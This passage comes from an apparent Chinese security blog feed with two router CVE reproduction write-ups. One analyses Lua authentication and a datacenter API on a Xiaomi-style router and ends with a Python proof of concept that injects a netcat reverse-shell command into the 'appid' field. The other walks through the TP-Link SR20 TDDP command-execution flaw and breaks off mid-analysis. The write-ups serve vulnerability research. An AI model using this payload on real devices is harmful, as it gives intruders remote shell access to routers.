class="literal">false</span></span><br><span class="line">      <span class="keyword">return</span> L7</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L7 = context</span><br><span class="line">  L8 = &#123;&#125;</span><br><span class="line">  L7.<span class="built_in">path</span> = L8</span><br><span class="line">  L7 = luci</span><br><span class="line">  L7 = L7.http</span><br><span class="line">  L7 = L7.<span class="built_in">write</span></span><br><span class="line">  L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:401,\&quot;msg\&quot;:\&quot;not auth\&quot;&#125;&quot;</span></span><br><span class="line">  L7(L8)</span><br><span class="line">  L7 = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">return</span> L7</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L10.jsonauth = L11</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™å°±æ˜¯é‰´æƒçš„å‡½æ•°ï¼Œé¦–å…ˆå¼•å…¥XQSysUtilæ¨¡å—ï¼Œç”¨äºç³»ç»Ÿå·¥å…·å‡½æ•°ï¼Œä¹‹åä¾¿æ˜¯è·å– HTTP è¯·æ±‚ä¸­çš„ <code>username</code>, <code>password</code>, <code>nonce</code> å‚æ•°ï¼Œå¦‚æœæœ‰nonceå‚æ•°ï¼Œé‚£ä¹ˆå°±è°ƒç”¨<code>_UPVALUE0_.checkNonce</code>å‡½æ•°æ¥æ£€æŸ¥nonceå‚æ•°ï¼Œå¦‚æœé€šè¿‡checknonceçš„æ£€æŸ¥å°±ä¼šæ‰§è¡ŒcheckUser(usrname,nonce,password)ï¼Œä¹Ÿé€šè¿‡äº†é‚£å°±æ­£å¸¸è¿”å›ï¼Œä¸ç„¶å°±å¤±è´¥ã€‚å› æ­¤è¦é€šè¿‡ä¸¤ä¸ªå‡½æ•°çš„æ£€æŸ¥ï¼Œchecknonceä¾¿ä¸å¿…å¤šè¯´ï¼Œåªçœ‹checkUserå‡½æ•°</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L13</span><span class="params">(A0, A1, A2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L3, L4, L5, L6, L7, L8, L9</span><br><span class="line">  L3 = _UPVALUE0_</span><br><span class="line">  L3 = L3.get</span><br><span class="line">  L4 = A0</span><br><span class="line">  L5 = <span class="literal">nil</span></span><br><span class="line">  L6 = <span class="string">&quot;account&quot;</span></span><br><span class="line">  L3 = L3(L4, L5, L6)</span><br><span class="line">  <span class="keyword">if</span> L3 <span class="keyword">then</span></span><br><span class="line">    L4 = _UPVALUE1_</span><br><span class="line">    L4 = L4.isStrNil</span><br><span class="line">    L5 = A2</span><br><span class="line">    L4 = L4(L5)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> L4 <span class="keyword">then</span></span><br><span class="line">      L4 = _UPVALUE1_</span><br><span class="line">      L4 = L4.isStrNil</span><br><span class="line">      L5 = A1</span><br><span class="line">      L4 = L4(L5)</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> L4 <span class="keyword">then</span></span><br><span class="line">        L4 = _UPVALUE2_</span><br><span class="line">        L4 = L4.sha1</span><br><span class="line">        L5 = A1</span><br><span class="line">        L6 = L3</span><br><span class="line">        L5 = L5 .. L6</span><br><span class="line">        L4 = L4(L5)</span><br><span class="line">        <span class="keyword">if</span> L4 == A2 <span class="keyword">then</span></span><br><span class="line">          L4 = <span class="literal">true</span></span><br><span class="line">          <span class="keyword">return</span> L4</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L4 = _UPVALUE3_</span><br><span class="line">  L4 = L4.<span class="built_in">log</span></span><br><span class="line">  L5 = <span class="number">4</span></span><br><span class="line">  L6 = luci</span><br><span class="line">  L6 = L6.http</span><br><span class="line">  L6 = L6.<span class="built_in">getenv</span></span><br><span class="line">  L7 = <span class="string">&quot;REMOTE_ADDR&quot;</span></span><br><span class="line">  L6 = L6(L7)</span><br><span class="line">  L6 = L6 <span class="keyword">or</span> L6</span><br><span class="line">  L7 = <span class="string">&quot; Authentication failed&quot;</span></span><br><span class="line">  L6 = L6 .. L7</span><br><span class="line">  L7 = A1</span><br><span class="line">  L8 = L3</span><br><span class="line">  L9 = A2</span><br><span class="line">  L4(L5, L6, L7, L8, L9)</span><br><span class="line">  L4 = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">return</span> L4</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">checkUser = L13</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç”¨getå‡½æ•°è·å¾—account.comman.usrnameï¼Œè¦æ±‚ä¸ä¸ºç©ºï¼Œç„¶åé€šè¿‡ä¸PostæŠ¥æ–‡ä¼ å…¥çš„nonceç°æ—¶å­—æ®µæ‹¼æ¥åsha1å“ˆå¸ŒåŠ å¯†ä¹‹åä¾¿æ˜¯PostæŠ¥æ–‡ä¸­çš„å¯†ç äº†ï¼Œé‚£æˆ‘ä»¬æ¥çœ‹PostæŠ¥æ–‡çš„å¯†ç å­—æ®µ</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657081.png" alt="image-20240712102435885"></p><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·åæ’ä¸ºadminï¼Œç„¶åpasswordè¦é€šè¿‡oldpwæ¥åŠ å¯†</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657083.png" alt="image-20240712102549234"></p><p>å¯ä»¥çœ‹åˆ°å®ƒreturnäº†ä¸€ä¸ªsha1åŠ å¯†å†…å®¹æ˜¯ï¼ˆnonceå­—æ®µ+sha1(pwd+key)ï¼‰Keyä¾¿æ˜¯ä¸Šé¢çš„ä¸€ä¸²ï¼Œpwdä¾¿æ˜¯ä¼ å…¥çš„å¯†ç ï¼Œç”±äºåœ¨luaæ–‡ä»¶ä¸­å¤„ç†å¯†ç ä¹Ÿä¼šåŠ æ‹¼æ¥ä¸Šä¸€ä¸ªnonceå­—æ®µï¼Œé‚£ç›¸å½“äºæ˜¯æ²¡æ‹¼æ¥ï¼Œé‚£ä¹ˆåªéœ€è¦æˆ‘ä»¬çš„account.common.adminæ˜¯sha1(s1nec-1o+key)ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„å¯†ç ä¾¿æ˜¯s1nec-1oäº†</p><p>ç”±äºæœ¬æ–‡çš„cveæ˜¯æˆæƒåçš„ï¼Œå› æ­¤è¦æœ‰å¯†ç æ‰å¯ä»¥å¤ç°</p><p>é‰´æƒå®Œæˆä¹‹åé‚£æˆ‘ä»¬å°±è¦ç»§ç»­ç ”ç©¶æ¼æ´äº†ï¼Œè¿˜æ˜¯çœ‹åˆ°apiæ§åˆ¶æ¨¡å—çš„</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">L1 = entry                                   <span class="comment">--request processing</span></span><br><span class="line">L2 = &#123;&#125;</span><br><span class="line">L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">L5 = <span class="string">&quot;request&quot;</span></span><br><span class="line">L2[<span class="number">1</span>] = L3</span><br><span class="line">L2[<span class="number">2</span>] = L4</span><br><span class="line">L2[<span class="number">3</span>] = L5</span><br><span class="line">L3 = call</span><br><span class="line">L4 = <span class="string">&quot;tunnelRequest&quot;</span></span><br><span class="line">L3 = L3(L4)</span><br><span class="line">L4 = _</span><br><span class="line">L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">L4 = L4(L5)</span><br><span class="line">L5 = <span class="number">301</span></span><br><span class="line">L1(L2, L3, L4, L5)    <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;,&quot;request&quot;&#125; , call(tunnelRequest) , _&quot;&quot; , 301 )</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­åœ¨è®¿é—®xqdatacenterè¯¥èŠ‚ç‚¹çš„æ—¶å€™ä¼šcall(tunnelRequest)æ¥å¯¹jsonæ•°æ®è¿›è¡Œè§£æ</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L5</span><span class="params">()</span></span>          <span class="comment">--tunnelRequest Function</span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6, L7, L8</span><br><span class="line">  L0 = <span class="built_in">require</span></span><br><span class="line">  L1 = <span class="string">&quot;xiaoqiang.util.XQCryptoUtil&quot;</span></span><br><span class="line">  L0 = L0(L1)         <span class="comment">--load xiaoqiang.util.XQCryptoUtil module</span></span><br><span class="line">  L1 = L0.binaryBase64Enc              <span class="comment">--call binaryBase64Enc Function</span></span><br><span class="line">  L2 = _UPVALUE0_</span><br><span class="line">  L2 = L2.formvalue_unsafe</span><br><span class="line">  L3 = <span class="string">&quot;payload&quot;</span></span><br><span class="line">  L2, L3, L4, L5, L6, L7, L8 = L2(L3)       <span class="comment">--formvalue_unsafe(payload)</span></span><br><span class="line">  L1 = L1(L2, L3, L4, L5, L6, L7, L8)       <span class="comment">--Base func retuen L1</span></span><br><span class="line">  L2 = _UPVALUE1_</span><br><span class="line">  L2 = L2.THRIFT_TUNNEL_TO_DATACENTER       <span class="comment">--thrifttunnel 0 &#x27;%s&#x27;</span></span><br><span class="line">  L2 = L2 % L1                              <span class="comment">---L1 tick to L2</span></span><br><span class="line">  L3 = <span class="built_in">require</span></span><br><span class="line">  L4 = <span class="string">&quot;luci.util&quot;</span></span><br><span class="line">  L3 = L3(L4)            <span class="comment">--load luci.util module</span></span><br><span class="line">  L4 = _UPVALUE0_</span><br><span class="line">  L4 = L4.<span class="built_in">write</span></span><br><span class="line">  L5 = L3.exec</span><br><span class="line">  L6 = L2</span><br><span class="line">  L5 = L5(L6)   <span class="comment">--luci.util&#x27;s exec Func (tunnel cmd)</span></span><br><span class="line">  L6 = <span class="literal">nil</span></span><br><span class="line">  L7 = <span class="literal">false</span></span><br><span class="line">  L8 = <span class="literal">true</span></span><br><span class="line">  L4(L5, L6, L7, L8)   <span class="comment">--write may ret</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">tunnelRequest = L5</span><br></pre></td></tr></table></figure><p>å…¶ä¸­è°ƒç”¨äº†XQCryptoUtilçš„binaryBase64Encå’Œformvalue_unsafeï¼ŒçŒœæµ‹æ˜¯å…ˆbase64åŠ å¯†ç„¶åç”¨formvalue_unsafeæ¥è·å–å†…å®¹å§ï¼Œæ˜¾ç„¶æ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œæœªè¿‡æ»¤å±é™©å­—ç¬¦ï¼Œè€ŒTHRIFT_TUNNEL_TO_DATACENTERçš„å«ä¹‰å¯ä»¥åœ¨&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;xiaoqiang&#x2F;common&#x2F;XQConfigs.luaä¸­æ‰¾åˆ°<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657084.png" alt="image-20240712104352614" style="zoom:50%;" /></p><p>å› æ­¤æœ€ç»ˆçš„stringæ˜¯<code>thrifttunnel 0 &#39;base64åŠ å¯†çš„payload&#39;</code>ä¹‹åä½¿ç”¨luci.utilçš„execæ¥æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œå› æ­¤payloadå­—æ®µä¸­è¢«Base64ç¼–ç çš„jsonæ•°æ®ä¼šè¢«ä¼ å…¥thrifttunnelç¨‹åºä¸­ä¸”opetionä¸º0</p><h2 id="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ"></a>äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657085.png" alt="image-20240712110152526"></p><p>ä¼šå‘ç°åœ¨thrifttunnelç¨‹åºä¸­ä»–å°†æ•°æ®å‘é€åˆ°äº†æœ¬åœ°ç«¯çš„9090ç«¯å£ï¼Œè€Œ&#x2F;usr&#x2F;lib&#x2F;datacenterç¨‹åºä¸€ç›´ç›‘å¬ç€9090ç«¯å£ï¼Œå› æ­¤æˆ‘ä»¬çš„æ•°æ®ä¼šåˆ°datacenterä¸­å»å¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657086.png" alt="image-20240712110442769"></p><p>è¿™ä¸ªå‡½æ•°æ˜¾ç„¶å°±æ˜¯ç›‘å¬çš„å‡½æ•°ï¼Œçœ‹datacenterçš„requestå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657087.png" alt="image-20240712163626431"></p><p>è°ƒç”¨äº†APIMappingå’ŒredirectRequestå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657088.png" alt="image-20240712163658072"></p><p>APIMapingä¸­è°ƒç”¨äº†constructAPIMappingTableå‡½æ•°ï¼Œå®ƒå»ºç«‹èµ·äº†apiå’Œhandleå‡½æ•°ä¹‹é—´çš„å…³ç³»</p><p>åœ¨redirectå‡½æ•°ä¸­<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657089.png" alt="image-20240712164126303"></p><p>å…ˆè·å–jsonå¯¹è±¡çš„apiå­—æ®µçš„å€¼ï¼Œå­˜æ”¾åœ¨v8å˜é‡ä¸­ï¼Œä¹‹åçš„å¾ªç¯æ—¶map.find()çš„è°ƒç”¨çš„åæ±‡ç¼–ï¼Œå…¶ä¸­åç§»+32æ˜¯ç¬¬ä¸€ä¸ªé”®å€¼å³apiï¼Œ+40ä¾¿æ˜¯å¯¹åº”çš„handleå‡½æ•°æŒ‡é’ˆï¼Œå› æ­¤æ˜¾ç„¶å¯ä»¥çŸ¥é“ä¸Šé¢ä¾¿æ˜¯apiä¸ºå¤šå°‘å°±ä¼šè°ƒç”¨å“ªé‡Œçš„å‡½æ•°</p><p>çœ‹åˆ°æ¼æ´æ‰€åœ¨å¤„ï¼Œå¯ä»¥çŸ¥é“å½“apiä¸º629æ—¶å‡ºé—®é¢˜ï¼Œçœ‹åˆ°apiä¸º629çš„åœ°æ–¹</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657090.png" alt="image-20240712164540707"></p><p>çœ‹å‡½æ•°è°ƒç”¨å…³ç³»å¯ä»¥æ‰¾åˆ°<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657091.png" alt="image-20240712164623136"></p><p>å®ƒè¿æ¥äº†9091ç«¯å£ï¼Œç„¶åå‘ç°plugincenterç›‘å¬äº†9091ç«¯å£ï¼Œå¯ä»¥å¾—çŸ¥æ•°æ®ä¼šè¢«è½¬å‘åˆ°plugincenteræ¥å¤„ç†</p><p>æ‰¾åˆ°plugincenterç„¶åçœ‹sConstructMappingTableå‡½æ•°ï¼Œå°±å¯ä»¥æ‰¾åˆ°å½“apiä¸º629è°ƒç”¨äº†parseGetIdForVendorå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657092.png" alt="image-20240712164913808"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657093.png" alt="image-20240712165122840"></p><p>å‘ç°å°±ç®—æ˜¯éæ³•çš„app idä¹Ÿä¼šæ‹¼æ¥åˆ°å‘½ä»¤ç„¶åæ‰§è¡Œï¼Œå› æ­¤å°±æœ‰ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ¼æ´</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/datacenter &amp;</span><br><span class="line">/usr/sbin/plugincenter &amp;</span><br></pre></td></tr></table></figure><p>å…ˆå°†æœåŠ¡å¼€å¯</p><p>ç„¶åæ‰§è¡ŒPoc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">server_ip = <span class="string">&quot;192.168.50.1&quot;</span></span><br><span class="line">client_ip = <span class="string">&quot;192.168.50.105&quot;</span></span><br><span class="line">token = <span class="string">&quot;814c55713043e7358d3c1f42f2a98438&quot;</span></span><br><span class="line"></span><br><span class="line">nc_shell = <span class="string">&quot;;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &#123;&#125; 8888 &gt;/tmp/f;&quot;</span>.<span class="built_in">format</span>(client_ip)</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&quot;http://&#123;&#125;/cgi-bin/luci/;stok=&#123;&#125;/api/xqdatacenter/request&quot;</span>.<span class="built_in">format</span>(server_ip, token), data=&#123;<span class="string">&#x27;payload&#x27;</span>:<span class="string">&#x27;&#123;&quot;api&quot;:629, &quot;appid&quot;:&quot;&#x27;</span> + nc_shell + <span class="string">&#x27;&quot;&#125;&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åšåˆ°åå¼¹shelläº†</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://forum.butian.net/share/3000">https://forum.butian.net/share/3000</a></p><p><a href="https://bbs.kanxue.com/thread-282034.htm">https://bbs.kanxue.com/thread-282034.htm</a></p><p><a href="https://zikh26.github.io/posts/3d9490d.html">https://zikh26.github.io/posts/3d9490d.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ä¸ªcveæ˜¯æˆ‘è‡³ä»Šä»¥æ¥å¤ç°çš„æœ€ä¸ºå¤æ‚çš„æ¼æ´äº†ï¼ŒwinmtçœŸç¥ï¼&lt;/p&gt;
&lt;h2 id=&quot;å›ºä»¶ä»¿çœŸ&quot;&gt;&lt;a href=&quot;#å›ºä»¶ä»¿çœŸ&quot; class=&quot;headerlink&quot; title=&quot;å›ºä»¶ä»¿çœŸ&quot;&gt;&lt;/a&gt;å›ºä»¶ä»¿çœŸ&lt;/h2&gt;&lt;p&gt;é¦–å…ˆå›ºä»¶çš„æå–å¯ä»¥çœ‹&lt;a href=&quot;http</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>TP-Link SR20å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°</title>
    <link href="http://s1nec-1o.github.io/2024/07/09/TP-Link-SR20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/07/09/TP-Link-SR20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-07-09T10:31:57.000Z</published>
    <updated>2024-07-09T10:33:18.195Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªæ¼æ´çš„æˆå› æ˜¯å› ä¸ºä»–çš„TDDPæœ¬èº«åè®®æœ‰ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ¼æ´</p><h2 id="TDDPåè®®"><a href="#TDDPåè®®" class="headerlink" title="TDDPåè®®"></a>TDDPåè®®</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832867.png" alt="image-20240709180753701"></p><p>åŸºäºUDPåè®®ï¼Œç«¯å£ä¸º1040ç«¯å£</p><p>ä»¥ä¸Šä¸ºTDDPåè®®çš„æŠ¥å¤´ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºversionï¼Œå³ç‰ˆæœ¬ã€‚tddpåè®®æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼š<code>version1</code>å’Œ<code>version2</code>ã€‚å…¶ä¸­<code>version1</code>ä¸æ”¯æŒèº«ä»½éªŒè¯å’Œå¯¹æ•°æ®åŒ…è½½è·çš„åŠ å¯†ï¼Œè€Œ<code>version2</code>è¦æ±‚èº«ä»½éªŒè¯å’ŒåŠ å¯†ã€‚ä¹Ÿæ­£æ˜¯å› ä¸º<code>version1</code>ä¸è¦æ±‚èº«ä»½çš„è®¤è¯å³å¯å¯¹è®¾å¤‡è¿›è¡Œè°ƒè¯•ï¼Œå¯¼è‡´å‡ºç°æ¼æ´ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ˜¯arm32å°ç«¯ï¼Œå·²ç»qemuè¿‡å¾ˆå¤šå›ºä»¶äº†ï¼Œå°±ä¸å†å¤šèµ˜è¿°ï¼Œä¹Ÿä¸ä¼šå¾ˆå¤æ‚</p><p>å¯åŠ¨è„šæœ¬å¦‚ä¸‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -net nic -net tap \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><h2 id="äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æ"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æ" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æ"></a>äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æ</h2><p>é¦–å…ˆæ˜¯ç”±tddpåè®®å‡ºé—®é¢˜ï¼Œç„¶åæ˜¯0x31çš„type</p><p>åœ¨&#x2F;usr&#x2F;bin&#x2F;tddpé‡Œ</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832868.png" alt="image-20240709181137853"></p><p>mainå‡½æ•°ä¸­æœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œå¤§è‡´çœ‹ä¸€çœ¼å‘ç°ï¼Œsub_16C90æ˜¯åˆå§‹åŒ–å †å—ï¼Œsub_16D40æ˜¯é‡Šæ”¾å†…å­˜ï¼Œé‚£ä¹ˆä¸»è¦çš„æ“ä½œåœ¨sub_93C6</p><h3 id="sub-93C6"><a href="#sub-93C6" class="headerlink" title="sub_93C6"></a>sub_93C6</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832869.png" alt="image-20240709181427771"></p><p>ä»–çš„ä¸»è¦å¤„ç†æ˜¯æ¥è‡ªtddp_type_handleå‡½æ•°</p><h3 id="tddp-type-handle"><a href="#tddp-type-handle" class="headerlink" title="tddp_type_handle"></a>tddp_type_handle</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832870.png" alt="image-20240709181523845"></p><p>çœ‹versionä¸º1çš„æƒ…å†µ</p><h3 id="tddp-type-version1-handle"><a href="#tddp-type-version1-handle" class="headerlink" title="tddp_type_version1_handle"></a>tddp_type_version1_handle</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832871.png" alt="image-20240709181605477"></p><p>è¿›æ¥å‘ç°æ˜¯å¤„ç†typeçš„éƒ¨åˆ†ï¼Œé‚£ä¹ˆæ‰¾åˆ°0x31çš„éƒ¨åˆ†è¿›å…¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x31</span>:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">692</span>);</span><br><span class="line">  v9 = sub_A580((<span class="type">int</span>)a1);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯sub_A580å‡½æ•°</p><h3 id="sub-A580"><a href="#sub-A580" class="headerlink" title="sub_A580"></a>sub_A580</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832872.png" alt="image-20240709181955545"></p><p>ç”±è¿™é‡Œå¯ä»¥çŸ¥é“ï¼Œä¸»è¦æ˜¯ä»version+12å¼€å§‹ä¼šç»„åˆä¸€ä¸ªå‘½ä»¤æ‰§è¡Œ</p><p>å…¶ä¸­sub_91DCå‡½æ•°ä¸­</p><h3 id="sub-91DC"><a href="#sub-91DC" class="headerlink" title="sub_91DC"></a>sub_91DC</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832873.png" alt="image-20240709182052280"></p><p>ä¼šæ‰§è¡Œsh -c s</p><p>å…¶ä¸­sæ˜¯ä¼ å…¥çš„å‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡|åˆ†å‰²æ¥è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>å¹¶ä¸”è¿˜æœ‰ä¸€ç§æ–¹å¼</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832874.png" alt="image-20240709182211053"></p><p>ä¼šç”¨tftpä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åé€šè¿‡luaçš„æ–¹å¼æ‰§è¡Œconfig_testå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æœ¬åœ°ä¼ªé€ 